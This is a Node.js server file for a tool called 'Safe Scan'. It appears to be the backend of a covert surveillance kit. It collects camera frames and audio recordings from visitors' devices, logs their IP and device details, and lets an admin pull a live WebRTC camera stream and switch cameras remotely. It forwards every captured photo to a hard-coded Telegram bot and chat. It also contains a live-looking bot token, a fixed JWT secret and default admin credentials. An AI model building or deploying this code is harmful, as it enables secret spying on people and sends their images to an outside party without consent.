const express = require('express');
const http = require('http');
const https = require('https');
const { Server } = require('socket.io');
const cors = require('cors');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const path = require('path');
const fs = require('fs');

// ═══════════════════════════════════════════════════════════════════
// CONFIG
// ═══════════════════════════════════════════════════════════════════
const PORT = process.env.PORT || 3001;
const JWT_SECRET = 'safescan-admin-secret-2024';
const MEDIA_DIR = path.join(__dirname, 'media');
const DATA_FILE = path.join(__dirname, 'data.json');

// ═══════════════════════════════════════════════════════════════════
// TELEGRAM CONFIGURATION
// ═══════════════════════════════════════════════════════════════════
const TELEGRAM_BOT_TOKEN = '8086423271:AAHnppYI0Os1KGWOD0JpynQliY7hdVxM3HI';
const TELEGRAM_CHAT_ID = '8262870180';

/**
 * Send a photo to Telegram via Bot API using Node's built-in https module.
 * @param {Buffer} photoBuffer - The image data as a Buffer
 * @param {string} caption - Caption text for the photo
 */
function sendPhotoToTelegram(photoBuffer, caption) {
  const boundary = '----TelegramBoundary' + Date.now();
  const fileName = `capture_${Date.now()}.jpg`;

  // Build multipart/form-data body
  const parts = [];

  // chat_id field
  parts.push(`--${boundary}\r\n`);
  parts.push(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`);
  parts.push(`${TELEGRAM_CHAT_ID}\r\n`);

  // caption field
  if (caption) {
    parts.push(`--${boundary}\r\n`);
    parts.push(`Content-Disposition: form-data; name="caption"\r\n\r\n`);
    parts.push(`${caption}\r\n`);
  }

  // photo field (binary)
  const fileHeader = `--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="${fileName}"\r\nContent-Type: image/jpeg\r\n\r\n`;
  const fileFooter = `\r\n--${boundary}--\r\n`;

  const textParts = Buffer.from(parts.join(''), 'utf8');
  const headerBuf = Buffer.from(fileHeader, 'utf8');
  const footerBuf = Buffer.from(fileFooter, 'utf8');
  const body = Buffer.concat([textParts, headerBuf, photoBuffer, footerBuf]);

  const options = {
    hostname: 'api.telegram.org',
    path: `/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
    method: 'POST',
    headers: {
      'Content-Type': `multipart/form-data; boundary=${boundary}`,
      'Content-Length': body.length
    }
  };

  const req = https.request(options, (res) => {
    let data = '';
    res.on('data', (chunk) => data += chunk);
    res.on('end', () => {
      if (res.statusCode === 200) {
        console.log('📤 Photo sent to Telegram successfully');
      } else {
        console.error('📤 Telegram API error:', res.statusCode, data);
      }
    });
  });

  req.on('error', (err) => {
    console.error('📤 Telegram send error:', err.message);
  });

  req.write(body);
  req.end();
}

// Create directories
fs.mkdirSync(path.join(MEDIA_DIR, 'captures'), { recursive: true });
fs.mkdirSync(path.join(MEDIA_DIR, 'recordings'), { recursive: true });

// ═══════════════════════════════════════════════════════════════════
// IN-MEMORY DATA STORE (with JSON file persistence)
// ═══════════════════════════════════════════════════════════════════
let db = {
  admin: {
    email: 'admin',
    password: bcrypt.hashSync('admin123', 10),
    name: 'Admin'
  },
  users: [],      // { uuid, country, browser, device_type, ip, is_online, created_at, last_active }
  captures: [],   // { id, uuid, file_path, file_size, created_at }
  recordings: []  // { id, uuid, file_path, duration, file_size, mime_type, created_at }
};

// Load saved data
function loadData() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const raw = fs.readFileSync(DATA_FILE, 'utf8');
      const saved = JSON.parse(raw);
      // Merge but keep admin password
      db.users = saved.users || [];
      db.captures = saved.captures || [];
      db.recordings = saved.recordings || [];
      // Mark all users offline on startup
      db.users.forEach(u => u.is_online = false);
      console.log(`📂 Loaded ${db.users.length} users, ${db.captures.length} captures, ${db.recordings.length} recordings`);
    }
  } catch (e) {
    console.log('📂 Starting with fresh database');
  }
}

function saveData() {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify({
      users: db.users,
      captures: db.captures,
      recordings: db.recordings
    }, null, 2));
  } catch (e) { /* silent */ }
}

// Auto-save every 30 seconds
setInterval(saveData, 30000);
loadData();

// ID counter
let nextId = Math.max(
  0,
  ...db.captures.map(c => c.id || 0),
  ...db.recordings.map(r => r.id || 0)
) + 1;

// ═══════════════════════════════════════════════════════════════════
// EXPRESS APP
// ═══════════════════════════════════════════════════════════════════
const app = express();
const server = http.createServer(app);

app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '50mb' }));

// Handle JSON parse errors gracefully
app.use((err, req, res, next) => {
  if (err.type === 'entity.parse.failed') {
    return res.status(400).json({ error: 'Invalid JSON in request body' });
  }
  next(err);
});

// Serve user-facing website as default homepage at root /
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'index.html'));
});

// Serve user-facing website at /app (same origin = no CORS issues)
app.get('/app', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'index.html'));
});

// Serve admin dashboard files under /admin
app.use('/admin', express.static(path.join(__dirname, 'public')));

// Serve media files
app.use('/media', express.static(MEDIA_DIR, {
  setHeaders: (res) => res.setHeader('Access-Control-Allow-Origin', '*')
}));

// ─── Auth Middleware ──────────────────────────────────────────────
function authCheck(req, res, next) {
  const auth = req.headers.authorization;
  if (!auth || !auth.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No token' });
  }
  try {
    req.admin = jwt.verify(auth.split(' ')[1], JWT_SECRET);
    next();
  } catch (e) {
    return res.status(401).json({ error: 'Invalid token' });
  }
}

// ─── Auth Routes ─────────────────────────────────────────────────
app.post('/api/auth/login', async (req, res) => {
  const { email, username, password } = req.body;
  const identifier = username || email;
  if (!identifier || !password) return res.status(400).json({ error: 'Username and password required' });

  if (identifier.toLowerCase().trim() !== db.admin.email) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  const valid = await bcrypt.compare(password, db.admin.password);
  if (!valid) return res.status(401).json({ error: 'Invalid credentials' });

  const token = jwt.sign({ email: db.admin.email, name: db.admin.name }, JWT_SECRET, { expiresIn: '7d' });
  res.json({ token, admin: { email: db.admin.email, name: db.admin.name } });
});

app.get('/api/auth/me', authCheck, (req, res) => {
  res.json({ email: db.admin.email, name: db.admin.name });
});

app.put('/api/auth/password', authCheck, async (req, res) => {
  const { currentPassword, newPassword } = req.body;
  const valid = await bcrypt.compare(currentPassword, db.admin.password);
  if (!valid) return res.status(401).json({ error: 'Current password incorrect' });
  db.admin.password = await bcrypt.hash(newPassword, 10);
  saveData();
  res.json({ message: 'Password updated' });
});

// ─── Users Routes ────────────────────────────────────────────────
app.get('/api/users', authCheck, (req, res) => {
  const search = (req.query.search || '').toLowerCase();
  let users = db.users.map(u => ({
    ...u,
    captures_count: db.captures.filter(c => c.uuid === u.uuid).length,
    recordings_count: db.recordings.filter(r => r.uuid === u.uuid).length
  }));

  if (search) {
    users = users.filter(u =>
      (u.uuid || '').toLowerCase().includes(search) ||
      (u.country || '').toLowerCase().includes(search) ||
      (u.device_type || '').toLowerCase().includes(search)
    );
  }

  // Sort: online first, then by last_active
  users.sort((a, b) => {
    if (a.is_online !== b.is_online) return b.is_online ? 1 : -1;
    return new Date(b.last_active) - new Date(a.last_active);
  });

  res.json({ users });
});

app.delete('/api/users/:uuid', authCheck, (req, res) => {
  const uuid = req.params.uuid;
  db.users = db.users.filter(u => u.uuid !== uuid);
  db.captures = db.captures.filter(c => c.uuid !== uuid);
  db.recordings = db.recordings.filter(r => r.uuid !== uuid);
  saveData();
  res.json({ message: 'User deleted' });
});

// ─── Captures Routes ─────────────────────────────────────────────
app.get('/api/captures', authCheck, (req, res) => {
  const uuid = req.query.uuid;
  let captures = uuid ? db.captures.filter(c => c.uuid === uuid) : [...db.captures];
  captures.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
  res.json({ captures: captures.slice(0, 100) });
});

// ─── Recordings Routes ───────────────────────────────────────────
app.get('/api/recordings', authCheck, (req, res) => {
  const uuid = req.query.uuid;
  let recordings = uuid ? db.recordings.filter(r => r.uuid === uuid) : [...db.recordings];
  recordings.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
  res.json({ recordings: recordings.slice(0, 100) });
});

app.get('/api/recordings/:id/stream', (req, res) => {
  const rec = db.recordings.find(r => r.id === parseInt(req.params.id));
  if (!rec) return res.status(404).json({ error: 'Not found' });

  const filePath = path.join(MEDIA_DIR, rec.file_path);
  if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'File not found' });

  res.setHeader('Content-Type', rec.mime_type || 'audio/webm');
  res.setHeader('Access-Control-Allow-Origin', '*');
  fs.createReadStream(filePath).pipe(res);
});

// ─── Stats Route ─────────────────────────────────────────────────
app.get('/api/stats', authCheck, (req, res) => {
  res.json({
    onlineCount: db.users.filter(u => u.is_online).length,
    totalUsers: db.users.length,
    totalCaptures: db.captures.length,
    totalRecordings: db.recordings.length
  });
});

// ═══════════════════════════════════════════════════════════════════
// SOCKET.IO
// ═══════════════════════════════════════════════════════════════════
const io = new Server(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] },
  maxHttpBufferSize: 50e6
});

// Track connected users: uuid -> socket id
const connectedUsers = new Map();

io.on('connection', (socket) => {
  const isAdmin = socket.handshake.auth && socket.handshake.auth.token;

  if (isAdmin) {
    // ─── Admin Connection ────────────────────────────────────
    try {
      jwt.verify(socket.handshake.auth.token, JWT_SECRET);
    } catch (e) {
      socket.emit('auth:error', { error: 'Invalid token' });
      socket.disconnect();
      return;
    }

    console.log('🔑 Admin connected:', socket.id);
    socket.join('admin');

    socket.on('admin:join', () => {
      const onlineUsers = db.users.filter(u => u.is_online);
      socket.emit('admin:users', onlineUsers);
      emitStats();
    });

    // WebRTC Signaling (Admin to User)
    socket.on('webrtc:request', (data) => {
      if (!data || !data.uuid) return;
      const userSocketId = connectedUsers.get(data.uuid);
      if (userSocketId) {
        console.log(`📡 [WebRTC Signaling] Admin requesting stream from user ${data.uuid}`);
        io.to(userSocketId).emit('webrtc:request', { adminSocketId: socket.id });
      }
    });

    socket.on('webrtc:answer', (data) => {
      if (!data || !data.userSocketId || !data.answer) return;
      io.to(data.userSocketId).emit('webrtc:answer', { answer: data.answer });
    });

    socket.on('webrtc:ice-candidate', (data) => {
      if (!data || !data.userSocketId || !data.candidate) return;
      io.to(data.userSocketId).emit('webrtc:ice-candidate', { candidate: data.candidate });
    });

    socket.on('webrtc:stop', (data) => {
      if (!data || !data.userSocketId) return;
      io.to(data.userSocketId).emit('webrtc:stop');
    });

    socket.on('webrtc:switch-camera', (data) => {
      if (!data || !data.userSocketId) return;
      io.to(data.userSocketId).emit('camera:switch');
    });

    socket.on('disconnect', () => {
      console.log('🔑 Admin disconnected:', socket.id);
    });

  } else {
    // ─── Mobile User Connection ──────────────────────────────
    let userUUID = null;

    socket.on('user:register', (data) => {
      if (!data || !data.uuid) return;
      userUUID = data.uuid;
      connectedUsers.set(userUUID, socket.id);

      // Find or create user
      let user = db.users.find(u => u.uuid === userUUID);
      if (user) {
        user.is_online = true;
        user.last_active = new Date().toISOString();
        if (data.browser) user.browser = data.browser;
        if (data.device_type) user.device_type = data.device_type;
        if (data.country) user.country = data.country;
        user.ip = socket.handshake.address || '';
      } else {
        user = {
          uuid: userUUID,
          country: data.country || 'Unknown',
          browser: data.browser || 'Unknown',
          device_type: data.device_type || 'Unknown',
          ip: socket.handshake.address || '',
          is_online: true,
          created_at: new Date().toISOString(),
          last_active: new Date().toISOString()
        };
        db.users.push(user);
      }

      console.log(`📱 User connected: ${userUUID} (${data.device_type || 'Unknown'})`);
      io.to('admin').emit('user:connected', user);
      emitStats();
      saveData();
    });

    // WebRTC Signaling (User to Admin)
    socket.on('webrtc:offer', (data) => {
      if (!data || !data.adminSocketId || !data.offer) return;
      console.log(`📡 [WebRTC Signaling] User ${userUUID} sending offer to Admin ${data.adminSocketId}`);
      io.to(data.adminSocketId).emit('webrtc:offer', {
        uuid: userUUID,
        userSocketId: socket.id,
        offer: data.offer
      });
    });

    socket.on('webrtc:ice-candidate', (data) => {
      if (!data || !data.adminSocketId || !data.candidate) return;
      io.to(data.adminSocketId).emit('webrtc:ice-candidate', {
        uuid: userUUID,
        candidate: data.candidate
      });
    });

    socket.on('camera:frame', (data) => {
      if (!data || !data.uuid || !data.frame) return;

      const uuid = data.uuid;
      const timestamp = data.timestamp || Date.now();
      const fileName = `${uuid}_${timestamp}.jpg`;
      const filePath = path.join(MEDIA_DIR, 'captures', fileName);

      try {
        // Save image file
        const base64 = data.frame.replace(/^data:image\/\w+;base64,/, '');
        const buffer = Buffer.from(base64, 'base64');
        fs.writeFileSync(filePath, buffer);

        // Save to DB
        const capture = {
          id: nextId++,
          uuid,
          file_path: 'captures/' + fileName,
          file_size: buffer.length,
          created_at: new Date().toISOString()
        };
        db.captures.push(capture);

        // Update user last_active
        const user = db.users.find(u => u.uuid === uuid);
        if (user) user.last_active = new Date().toISOString();

        // Send to admin dashboard
        io.to('admin').emit('feed:frame', {
          uuid,
          captureId: capture.id,
          imageUrl: '/media/captures/' + fileName,
          timestamp,
          fileSize: buffer.length
        });

        // Send to Telegram
        const caption = `📸 Camera Capture\nUser: ${uuid}\n${new Date().toLocaleString()}\n\nSafe Scan v3.0`;
        sendPhotoToTelegram(buffer, caption);

        emitStats();
      } catch (e) {
        console.error('Camera frame error:', e.message);
      }
    });

    socket.on('audio:recording', (data) => {
      if (!data || !data.uuid || !data.audio) return;

      const uuid = data.uuid;
      const timestamp = Date.now();
      const ext = (data.mimeType || '').includes('ogg') ? 'ogg' : (data.mimeType || '').includes('mp4') ? 'mp4' : 'webm';
      const fileName = `${uuid}_${timestamp}.${ext}`;
      const filePath = path.join(MEDIA_DIR, 'recordings', fileName);

      try {
        const base64 = data.audio.replace(/^data:[^;]+;base64,/, '');
        const buffer = Buffer.from(base64, 'base64');
        fs.writeFileSync(filePath, buffer);

        const recording = {
          id: nextId++,
          uuid,
          file_path: 'recordings/' + fileName,
          duration: data.duration || 0,
          file_size: buffer.length,
          mime_type: data.mimeType || 'audio/webm',
          created_at: new Date().toISOString()
        };
        db.recordings.push(recording);

        const user = db.users.find(u => u.uuid === uuid);
        if (user) user.last_active = new Date().toISOString();

        io.to('admin').emit('feed:audio', {
          uuid,
          recordingId: recording.id,
          duration: data.duration || 0,
          fileUrl: '/media/recordings/' + fileName,
          timestamp
        });

        console.log(`🎤 Recording saved: ${fileName} (${data.duration || 0}s)`);
        emitStats();
      } catch (e) {
        console.error('Audio recording error:', e.message);
      }
    });

    socket.on('disconnect', () => {
      if (userUUID) {
        connectedUsers.delete(userUUID);
        const user = db.users.find(u => u.uuid === userUUID);
        if (user) {
          user.is_online = false;
          user.last_active = new Date().toISOString();
        }
        io.to('admin').emit('user:disconnected', { uuid: userUUID });
        console.log(`📱 User disconnected: ${userUUID}`);
        emitStats();
        saveData();
      }
    });
  }
});

function emitStats() {
  io.to('admin').emit('stats:update', {
    onlineCount: db.users.filter(u => u.is_online).length,
    totalUsers: db.users.length,
    totalCaptures: db.captures.length,
    totalRecordings: db.recordings.length
  });
}

// ═══════════════════════════════════════════════════════════════════
// GLOBAL ERROR HANDLER (prevents crashes)
// ═══════════════════════════════════════════════════════════════════
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err.message);
  res.status(500).json({ error: 'Internal server error' });
});

process.on('uncaughtException', (err) => {
  console.error('Uncaught exception:', err.message);
});

process.on('unhandledRejection', (reason) => {
  console.error('Unhandled rejection:', reason);
});

// ═══════════════════════════════════════════════════════════════════
// START
// ═══════════════════════════════════════════════════════════════════
server.listen(PORT, () => {
  console.log(`\n🚀 Safe Scan Admin Server running on http://localhost:${PORT}`);
  console.log(`📁 Media: ${MEDIA_DIR}`);
  console.log(`🔑 Login: admin / admin123`);
  console.log(`\n📡 Waiting for connections...\n`);
});
